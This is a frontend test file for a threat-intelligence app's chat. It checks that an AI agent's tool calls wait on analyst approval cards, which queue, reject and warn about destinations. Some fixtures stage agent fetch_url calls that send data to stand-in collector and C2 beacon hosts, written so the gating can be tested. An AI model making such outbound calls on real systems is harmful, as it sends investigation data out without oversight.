/**
 * C-CHAT-5/6 and the approval card: ChatView works in the conversation's own
 * investigation, queues one card per call, and only its approve handler turns
 * a card into an approval. Real tools, decision table and dispatcher.
 */
import { act, cleanup, configure, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import type { ComponentType } from 'react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { db } from '../db';
import i18n from '../i18n';
import deChat from '../../public/locales/de/chat.json';
import { renderMarkdown, sanitizeHtml } from '../lib/markdown';
import type { ChatThread, Folder, Settings, ToolUseBlock } from '../types';
import type { ToolExecutionResult } from '../lib/llm-tool-execution';
import type { ApprovalItem } from '../lib/chat-tool-executor';
import { ChatView } from '../components/Chat/ChatView';
import { ChatApprovalCard } from '../components/Chat/ChatApprovalCard';
import { discardAllComposerDrafts } from '../lib/chat-composer-drafts';
import { canary, ids, seedAIWorkspace } from './helpers/ai-workspace';
import { installEgressSpy, type EgressSpy } from './helpers/egress-spy';

// Each card waits on Dexie reads (binding, reach); allow for a loaded full-suite run.
configure({ asyncUtilTimeout: 5000 });

type ToolHandler = (toolUse: ToolUseBlock, signal: AbortSignal) => Promise<ToolExecutionResult>;
const state = vi.hoisted(() => ({
  selectedThreadId: 'thread',
  folder: undefined as Folder | undefined,
  input: { onSend: async () => {} } as { onSend: (text: string) => Promise<void> },
  send: vi.fn(),
}));
vi.mock('../hooks/useLLM', () => ({ useLLM: () => ({ extensionAvailable: true, streamingContent: '', isStreaming: false, error: null,
  toolActivity: [], sendAgentRequest: state.send, abort: vi.fn() }) }));
vi.mock('../contexts/AuthContext', () => ({ useAuth: () => ({ serverUrl: '', user: null }) }));
vi.mock('../contexts/NavigationContext', () => ({ useNavigation: () => ({ selectedChatThreadId: state.selectedThreadId, setSelectedChatThreadId: vi.fn() }) }));
vi.mock('../contexts/InvestigationContext', () => ({ useInvestigation: () => ({ selectedFolderId: state.folder?.id, selectedFolder: state.folder }) }));
vi.mock('../contexts/ToastContext', () => ({ useToast: () => ({ addToast: vi.fn() }) }));
vi.mock('../hooks/useChatLoops', () => ({ useChatLoops: () => ({ loops: [], startLoop: vi.fn(), stopAllForThread: vi.fn() }) }));
vi.mock('../hooks/useCustomSlashCommands', () => ({ useCustomSlashCommands: () => ({ commands: [] }),
  interpolateTemplate: (template: string) => template }));
// The composer: a slash or mention menu that is open uses Escape to close itself.
vi.mock('../components/Chat/ChatInput', () => ({ ChatInput: (props: typeof state.input) => {
  state.input = props;
  return <textarea aria-label="Message" onKeyDown={event => { if (event.key === 'Escape' && event.currentTarget.dataset.menuOpen) event.preventDefault(); }} />;
} }));
vi.mock('../components/Chat/ChatMessage', () => ({ ChatMessageBubble: () => null }));
vi.mock('../components/Agent/AgentCycleSummaryCard', () => ({ AgentCycleSummaryCard: () => null }));
// Virtuoso renders the Footer as a component, so a new Footer function on each ChatView render
// remounts it. The approval card lives outside the list, so it keeps its state and focus.
vi.mock('react-virtuoso', () => ({ Virtuoso: ({ components }: { components?: { Footer?: ComponentType } }) => {
  const Footer = components?.Footer;
  return Footer ? <Footer /> : null;
} }));

const makeThread = (id: string, folderId?: string): ChatThread => ({ id, title: `Chat ${id}`, folderId, model: 'synthetic-model', provider: 'anthropic',
  messages: [{ id: `${id}-m1`, role: 'user', content: 'Earlier question', createdAt: 1 }], tags: [], trashed: false, archived: false, createdAt: 1, updatedAt: 1 });
const settings = { llmAnthropicApiKey: 'synthetic-unit-test-only', llmRoutingMode: 'auto' } as Settings;
const call = (name: string, input: Record<string, unknown>, id = `call-${name}`): ToolUseBlock => ({ type: 'tool_use', id, name, input });
const errorOf = (result: ToolExecutionResult) => String(JSON.parse(result.result).error ?? '');
const chatCatalogs = import.meta.glob<{ default: { fetch: { createdNote: string } } }>('../../public/locales/*/chat.json', { eager: true });

function renderChat(threads: ChatThread[]) {
  const props = { settings, onCreateThread: vi.fn(), onUpdateThread: vi.fn(), onAddMessage: vi.fn().mockResolvedValue(undefined), onTrashThread: vi.fn() };
  const view = render(<ChatView threads={threads} {...props} />);
  return { props, rerender: () => view.rerender(<ChatView threads={threads} {...props} />) };
}
async function sendAndGetHandler(): Promise<ToolHandler> {
  await act(async () => { await state.input.onSend('Look into it'); });
  return state.send.mock.calls[state.send.mock.calls.length - 1][1] as ToolHandler;
}
function start(handler: ToolHandler, toolUse: ToolUseBlock, signal = new AbortController().signal) {
  let pending!: Promise<ToolExecutionResult>;
  act(() => { pending = handler(toolUse, signal); });
  return pending;
}
// The card is named by its title; the Details disclosure is an unnamed group.
const card = () => screen.findByRole('group', { name: /\?$/ });
const queryCard = () => screen.queryByRole('group', { name: /\?$/ });
const bothQueued = () => waitFor(() => expect(within(screen.getByRole('group', { name: /\?$/ })).getByText('1 of 2')).toBeInTheDocument());
// A card that just appeared ignores Approve for a moment; wait it out, as a reading analyst does.
async function approve() {
  const button = screen.getByRole('button', { name: /approve/i });
  await waitFor(() => expect(button).toBeEnabled());
  fireEvent.click(button);
}

let egress: EgressSpy;
beforeEach(async () => {
  discardAllComposerDrafts();
  vi.clearAllMocks();
  await seedAIWorkspace();
  localStorage.clear();
  localStorage.setItem('caddyai-onboarded', '1');
  egress = installEgressSpy();
  state.selectedThreadId = 'thread';
  state.folder = undefined;
  Element.prototype.scrollIntoView = vi.fn();
});
afterEach(() => { cleanup(); egress.restore(); discardAllComposerDrafts(); });

describe('C-CHAT-5 chat works in the conversation\'s investigation', () => {
  it('a thread filed in S uses S in the global view: prompt, hidden local-only rows and cross-investigation cards', async () => {
    renderChat([makeThread('thread', 'S')]);
    const handler = await sendAndGetHandler();
    expect(state.send.mock.calls[0][0].systemPrompt).toContain('Investigation: "Shared case"');

    const hidden = await start(handler, call('read_note', { id: ids('L').note }));
    expect(errorOf(hidden)).toMatch(/not found/i);
    expect(queryCard()).toBeNull();

    const search = start(handler, call('search_across_investigations', { query: 'CANARY' }));
    const shown = await card();
    expect(within(shown).getByText('Read other investigations?')).toBeInTheDocument();
    // Investigation names are looked up after the card appears.
    expect(await within(shown).findByText(/syncs to the members of "Shared case"/)).toBeInTheDocument();
    await approve();
    const result = await search;
    expect(result.isError).toBe(false);
    expect(result.result).not.toContain(canary('L'));
  });

  it('/fetch files its note in the thread\'s investigation from the global view', async () => {
    renderChat([makeThread('thread', 'S')]);
    await act(async () => { await state.input.onSend('/fetch https://www.cisa.gov/advisory'); });
    expect(egress.fetchUrlPosts()).toEqual(['https://www.cisa.gov/advisory']);
    expect(await db.notes.where('title').equals('Fixture page').toArray()).toEqual([expect.objectContaining({ folderId: 'S' })]);
    expect(state.send).not.toHaveBeenCalled();
  });

  it('/fetch reports in the analyst\'s language', async () => {
    for (const [namespace, values] of Object.entries(i18n.getDataByLanguage('en') ?? {})) i18n.addResourceBundle('de', namespace, values, true, false);
    i18n.addResourceBundle('de', 'chat', deChat, true, true);
    await act(async () => { await i18n.changeLanguage('de'); });
    const addNote = vi.spyOn(db.notes, 'add');
    try {
      const { props } = renderChat([makeThread('thread', 'S')]);
      await act(async () => { await state.input.onSend('/fetch https://www.cisa.gov/advisory'); });
      await act(async () => { await state.input.onSend('/fetch https://intranet.local/x'); });
      // The page arrives but its note cannot be saved.
      addNote.mockRejectedValueOnce(new Error('Synthetic storage failure'));
      await act(async () => { await state.input.onSend('/fetch https://www.cisa.gov/second'); });
      const replies = props.onAddMessage.mock.calls.map(([, message]) => message).filter(message => message.role === 'assistant');
      expect(replies.map(message => message.content)).toEqual([
        'Notiz **Fixture page** aus https://www.cisa.gov/advisory erstellt',
        `URL konnte nicht abgerufen werden: ${i18n.t('fetch.privateTarget', { ns: 'integrations' })}`,
        'URL konnte nicht abgerufen werden: Synthetic storage failure',
      ]);
      expect(egress.fetchUrlPosts()).toEqual(['https://www.cisa.gov/advisory', 'https://www.cisa.gov/second']);
    } finally {
      addNote.mockRestore();
      await act(async () => { await i18n.changeLanguage('en'); });
    }
  });

  it('/fetch\'s note confirmation links exactly the fetched address and bolds the page title in every language', () => {
    const url = 'https://www.cisa.gov/advisory';
    const title = 'CISA (AA24-123A)';
    const rendered = Object.fromEntries(Object.entries(chatCatalogs).map(([path, catalog]) => {
      // ChatView fills the template without escaping; the message bubble renders it as markdown without media.
      const content = catalog.default.fetch.createdNote.replace('{{title}}', title).replace('{{url}}', url);
      const html = document.createElement('div');
      html.innerHTML = sanitizeHtml(renderMarkdown(content, undefined, { disableMedia: true }), { disableMedia: true });
      return [path.split('/').at(-2), { links: [...html.querySelectorAll('a')].map(link => link.getAttribute('href')),
        bold: [...html.querySelectorAll('strong')].map(node => node.textContent) }];
    }));
    expect(Object.keys(rendered)).toHaveLength(21);
    expect(rendered).toEqual(Object.fromEntries(Object.keys(rendered).map(lng => [lng, { links: [url], bold: [title] }])));
  });

  it('Export as note files the note in the thread\'s investigation from the global view', async () => {
    renderChat([makeThread('thread', 'S')]);
    fireEvent.click(screen.getByTitle('Export as note'));
    const exported = db.notes.where('title').equals('Chat Export: Chat thread');
    await waitFor(async () => expect(await exported.count()).toBe(1));
    expect(await exported.first()).toMatchObject({ folderId: 'S', tags: ['chat-export'] });
  });

  it('Export as note files an unfiled thread\'s note in the selected investigation', async () => {
    state.folder = { id: 'P', name: 'Private case', order: 1, createdAt: 1 };
    renderChat([makeThread('thread')]);
    fireEvent.click(screen.getByTitle('Export as note'));
    const exported = db.notes.where('title').equals('Chat Export: Chat thread');
    await waitFor(async () => expect(await exported.count()).toBe(1));
    expect(await exported.first()).toMatchObject({ folderId: 'P', tags: ['chat-export'] });
  });

  it('an unfiled thread in the global view reads freely and names the investigation a change would reach', async () => {
    renderChat([makeThread('thread')]);
    const handler = await sendAndGetHandler();
    expect((await start(handler, call('read_note', { id: ids('S').note }))).result).toContain(canary('S'));

    const update = start(handler, call('update_note', { id: ids('S').note, content: 'Overwritten' }));
    const shown = await card();
    expect(within(shown).getByText('Change another investigation?')).toBeInTheDocument();
    expect(await within(shown).findByText('Shared case: syncs to its members')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: /reject/i }));
    expect(errorOf(await update)).toMatch(/rejected/i);
    expect((await db.notes.get(ids('S').note))?.content).toBe(`Evidence ${canary('S')}`);
  });
});

describe('C-CHAT-6 the approval queue', () => {
  const fetchA = call('fetch_url', { url: 'https://collector.example/a' }, 'call-a');
  const fetchB = call('fetch_url', { url: 'https://collector.example/b' }, 'call-b');

  it('shows one card at a time, oldest first, and runs each call once approved', async () => {
    state.folder = { id: 'S', name: 'Shared case', order: 0, createdAt: 1 };
    renderChat([makeThread('thread', 'S')]);
    const handler = await sendAndGetHandler();
    const first = start(handler, fetchA);
    const second = start(handler, fetchB);
    await bothQueued();
    expect(screen.getAllByRole('group', { name: /\?$/ })).toHaveLength(1);
    expect(screen.getByText(/collector\.example\/a/)).toBeInTheDocument();

    await approve();
    expect((await first).isError).toBe(false);
    await waitFor(() => expect(screen.getByText(/collector\.example\/b/)).toBeInTheDocument());
    expect(within(await card()).queryByText('1 of 2')).toBeNull();
    await approve();
    expect((await second).isError).toBe(false);
    expect(egress.fetchUrlPosts()).toEqual(['https://collector.example/a', 'https://collector.example/b']);
    expect(queryCard()).toBeNull();
  });

  it('a double click on Approve approves only the card the analyst saw', async () => {
    renderChat([makeThread('thread', 'S')]);
    const handler = await sendAndGetHandler();
    const first = start(handler, fetchA);
    let secondSettled = false;
    const second = start(handler, fetchB).finally(() => { secondSettled = true; });
    await bothQueued();

    await approve();
    // The second click lands where the next card's Approve button has just appeared.
    fireEvent.click(screen.getByRole('button', { name: /approve/i }));
    expect((await first).isError).toBe(false);
    expect(within(screen.getByRole('group', { name: /\?$/ })).getByText(/collector\.example\/b/)).toBeInTheDocument();
    expect(secondSettled).toBe(false);
    expect(egress.fetchUrlPosts()).toEqual(['https://collector.example/a']);

    await approve();
    expect((await second).isError).toBe(false);
    expect(egress.fetchUrlPosts()).toEqual(['https://collector.example/a', 'https://collector.example/b']);
  });

  it('keeps Approve disabled for longer than a double click after a card appears', () => {
    const item: ApprovalItem = { toolUse: fetchB, reason: 'egress', readForeignThisRequest: false,
      reach: { name: 'fetch_url', write: false, homeShareable: false, crossRead: false, crossWrite: false, targetFolderIds: [],
        hidden: false, egress: 'open-fetch', destinations: ['collector.example'], harvested: false, flags: [] } };
    const onApprove = vi.fn();
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
    try {
      render(<ChatApprovalCard item={item} index={1} total={1} onApprove={onApprove} onReject={vi.fn()} />);
      const button = screen.getByRole('button', { name: /approve/i });
      act(() => { vi.advanceTimersByTime(300); });
      expect(button).toBeDisabled();
      fireEvent.click(button);
      act(() => { vi.advanceTimersByTime(200); });
      expect(button).toBeEnabled();
      fireEvent.click(button);
      expect(onApprove).toHaveBeenCalledTimes(1);
    } finally { vi.useRealTimers(); }
  });

  it('a thread switch rejects every queued card and runs nothing', async () => {
    const view = renderChat([makeThread('thread', 'S'), makeThread('other', 'S')]);
    const handler = await sendAndGetHandler();
    const first = start(handler, fetchA);
    const second = start(handler, fetchB);
    await bothQueued();

    state.selectedThreadId = 'other';
    view.rerender();
    expect(errorOf(await first)).toMatch(/rejected/i);
    expect(errorOf(await second)).toMatch(/rejected/i);
    expect(queryCard()).toBeNull();
    expect(egress.fetchUrlPosts()).toEqual([]);
  });

  it('stopping the reply cancels every queued card', async () => {
    renderChat([makeThread('thread', 'S')]);
    const handler = await sendAndGetHandler();
    const controller = new AbortController();
    const first = start(handler, fetchA, controller.signal);
    const second = start(handler, fetchB, controller.signal);
    await bothQueued();
    act(() => controller.abort());
    expect(errorOf(await first)).toMatch(/cancelled/i);
    expect(errorOf(await second)).toMatch(/cancelled/i);
    await waitFor(() => expect(queryCard()).toBeNull());
    expect(egress.fetchUrlPosts()).toEqual([]);
  });
});

describe('the approval card', () => {
  it('Enter does not approve, and Escape rejects', async () => {
    renderChat([makeThread('thread', 'S')]);
    const handler = await sendAndGetHandler();
    const pending = start(handler, call('fetch_url', { url: 'https://collector.example/c' }));
    const shown = await card();
    await waitFor(() => expect(document.activeElement).toBe(shown));
    fireEvent.keyDown(shown, { key: 'Enter' });
    fireEvent.keyPress(shown, { key: 'Enter' });
    expect(await card()).toBe(shown);
    fireEvent.keyDown(shown, { key: 'Escape' });
    expect(errorOf(await pending)).toMatch(/rejected/i);
    expect(egress.fetchUrlPosts()).toEqual([]);
  });

  it('does not take focus from the composer while the analyst types; Escape in the empty composer rejects', async () => {
    renderChat([makeThread('thread', 'S')]);
    const handler = await sendAndGetHandler();
    const composer = screen.getByRole('textbox', { name: 'Message' }) as HTMLTextAreaElement;
    act(() => composer.focus());
    fireEvent.change(composer, { target: { value: 'Draft reply' } });
    const pending = start(handler, call('fetch_url', { url: 'https://collector.example/d' }));
    const shown = await card();
    expect(document.activeElement).toBe(composer);
    fireEvent.keyDown(composer, { key: 'Escape' });
    expect(await card()).toBe(shown);

    fireEvent.change(composer, { target: { value: '' } });
    composer.dataset.menuOpen = '1';
    fireEvent.keyDown(composer, { key: 'Escape' });
    expect(await card()).toBe(shown);
    delete composer.dataset.menuOpen;
    fireEvent.keyDown(composer, { key: 'Escape' });
    expect(errorOf(await pending)).toMatch(/rejected/i);
    expect(egress.fetchUrlPosts()).toEqual([]);
  });

  it('announces the card that needs a decision', async () => {
    renderChat([makeThread('thread', 'S')]);
    const handler = await sendAndGetHandler();
    const status = screen.getByRole('status');
    expect(status).toHaveTextContent(/^$/);
    void start(handler, call('fetch_url', { url: 'https://collector.example/a' }, 'call-a'));
    void start(handler, call('update_note', { id: ids('P').note, content: 'Overwritten' }, 'call-b'));
    await waitFor(() => expect(status).toHaveTextContent('Send data outside ThreatCaddy? fetch_url 1 of 2'));
    expect(within(status).queryByRole('button')).toBeNull();

    fireEvent.click(within(await card()).getByRole('button', { name: /reject/i }));
    await waitFor(() => expect(status).toHaveTextContent('Change another investigation? update_note'));
    expect(status).not.toHaveTextContent('of');
  });

  it('keeps Details open and the investigation lines when the list re-renders', async () => {
    const view = renderChat([makeThread('thread')]);
    const handler = await sendAndGetHandler();
    void start(handler, call('update_note', { id: ids('S').note, content: 'Overwritten' }));
    const shown = await card();
    expect(await within(shown).findByText('Shared case: syncs to its members')).toBeInTheDocument();
    const details = shown.querySelector('details') as HTMLDetailsElement;
    act(() => { details.open = true; details.dispatchEvent(new Event('toggle')); });

    view.rerender();
    const after = screen.getByRole('group', { name: /\?$/ });
    expect(after.querySelector('details')).toHaveAttribute('open');
    expect(within(after).getByText('Shared case: syncs to its members')).toBeInTheDocument();
  });

  it('keeps keyboard focus on its buttons when the chat re-renders', async () => {
    const view = renderChat([makeThread('thread', 'S')]);
    const handler = await sendAndGetHandler();
    void start(handler, call('fetch_url', { url: 'https://collector.example/e' }));
    const shown = await card();
    const reject = within(shown).getByRole('button', { name: /reject/i });
    act(() => reject.focus());

    view.rerender();
    expect(screen.getByRole('group', { name: /\?$/ })).toBe(shown);
    expect(document.activeElement).toBe(reject);
  });

  it('leads with the destination and its warnings, with the raw input under Details', async () => {
    await db.standaloneIOCs.add({ id: 'c2', folderId: 'S', type: 'domain', value: 'c2.example', confidence: 'high', tags: [], trashed: false, archived: false, createdAt: 1, updatedAt: 1 });
    renderChat([makeThread('thread', 'S')]);
    const handler = await sendAndGetHandler();
    const url = `https://c2.example/beacon?d=${'A'.repeat(300)}`;
    void start(handler, call('fetch_url', { url }));
    const shown = await card();
    expect(within(shown).getByText('Send data outside ThreatCaddy?')).toBeInTheDocument();
    expect(within(shown).getByText('Opens a page on c2.example. The site receives the full address.')).toBeInTheDocument();
    expect(within(shown).getByText('Not one of the built-in reference sites.')).toBeInTheDocument();
    expect(within(shown).getByText('The address is long enough to carry investigation data.')).toBeInTheDocument();
    expect(within(shown).getByText(/This site is an IOC in this investigation/)).toBeInTheDocument();
    const details = within(shown).getByText('Details').closest('details');
    expect(details).not.toHaveAttribute('open');
    expect(details?.textContent).toContain(url);
  });
});
